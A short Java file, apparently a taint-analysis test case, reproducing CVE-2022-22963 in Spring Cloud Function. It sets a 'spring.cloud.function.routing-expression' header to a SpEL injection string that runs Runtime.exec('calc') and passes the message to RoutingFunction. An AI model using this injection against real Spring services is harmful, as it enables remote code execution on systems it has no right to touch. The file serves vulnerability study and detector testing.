import org.springframework.cloud.function.context.config.RoutingFunction;
import org.springframework.messaging.Message;
import org.springframework.messaging.support.MessageBuilder;

// CVE-2022-22963
public class Server {
    public static void main(String[] args) {
        RoutingFunction routingFunction = new RoutingFunction(null, null);
        Message<String> message = getMessage();
        routingFunction.apply(message);
    }

    private static Message<String> getMessage() {
        return MessageBuilder.withPayload("hello")
                .setHeader("spring.cloud.function.routing-expression", getInput())
                .build();
    }

    private static String getInput() {
        char[] chs = "T(java.lang.Runtime).getRuntime().exec(\"calc\")".toCharArray();
        chs[0] = taint();
        return new String(chs);
    }

    public static char taint(){
        return 'T';
    }
}
